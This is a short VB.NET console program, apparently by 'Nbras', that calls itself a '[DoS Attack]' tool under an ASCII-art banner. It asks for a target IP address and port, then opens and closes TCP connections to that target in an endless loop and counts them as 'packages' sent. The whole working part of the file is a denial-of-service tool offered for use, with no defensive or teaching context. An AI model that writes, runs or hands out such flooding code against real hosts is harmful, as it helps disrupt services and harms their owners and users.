Imports System.Net
Imports System.Net.Sockets
Module Module1
    Sub Main()
        Console.ForegroundColor = ConsoleColor.Green
        Console.WriteLine("                              ------------------------------                         ")
        Console.WriteLine("                              -       [DoS Attack]      -                            ")
        Console.WriteLine("                              ------------------------------                         ")
        Console.WriteLine("                                                                                     ")
        Console.WriteLine("                         ░░░░░░░░░░░░░░░░░░░░░░█████████░░░░░░░░░                    ")
        Console.WriteLine("                         ░░███████░░░░░░░░░░███▒▒▒▒▒▒▒▒███░░░░░░░                    ")
        Console.WriteLine("                         ░░█▒▒▒▒▒▒█░░░░░░░███▒▒▒▒▒▒▒▒▒▒▒▒▒███░░░░                    ")
        Console.WriteLine("                         ░░░█▒▒▒▒▒▒█░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░                    ")
        Console.WriteLine("                         ░░░░█▒▒▒▒▒█░░░██▒▒▒▒▒██▒▒▒▒▒▒██▒▒▒▒▒███░                    ")
        Console.WriteLine("                         ░░░░░█▒▒▒█░░░█▒▒▒▒▒▒████▒▒▒▒████▒▒▒▒▒▒██                    ")
        Console.WriteLine("                         ░░░█████████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                    ")
        Console.WriteLine("                         ░░░█▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒██                    ")
        Console.WriteLine("                         ░██▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒██▒▒▒▒▒▒▒▒▒▒██▒▒▒▒██                    ")
        Console.WriteLine("                         ██▒▒▒███████████▒▒▒▒▒██▒▒▒▒▒▒▒▒██▒▒▒▒▒██                    ")
        Console.WriteLine("                         █▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒████████▒▒▒▒▒▒▒██                    ")
        Console.WriteLine("                         ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░                    ")
        Console.WriteLine("                         ░█▒▒▒███████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██░░░                    ")
        Console.WriteLine("                         ░██▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█░░░░░                    ")
        Console.WriteLine("                         ░░████████████░░░█████████████████░░░░░░                    ")
        Console.WriteLine("                              -----------------------------                          ")
        Console.WriteLine("                              -        [By Nbras]       -                            ")
        Console.WriteLine("                              -----------------------------                          ")
        Console.ForegroundColor = ConsoleColor.DarkBlue
        Console.WriteLine("IP Address:")
        Dim ip As String = Console.ReadLine
        Console.WriteLine("Port:")
        Dim porta As Integer = Console.ReadLine
        Dim x As Integer
        Do
            Try
                Dim iep As IPEndPoint
                iep = New IPEndPoint(IPAddress.Parse(ip), Convert.ToInt32(porta)) 'target
                Dim s As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                s.Connect(iep)
                s.Close()
                x += 1
                Console.WriteLine("Packages are being sent:  " & x)
            Catch ex As Exception
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine("Pacchetti Inviati:  " & x)
            End Try
        Loop
    End Sub
End Module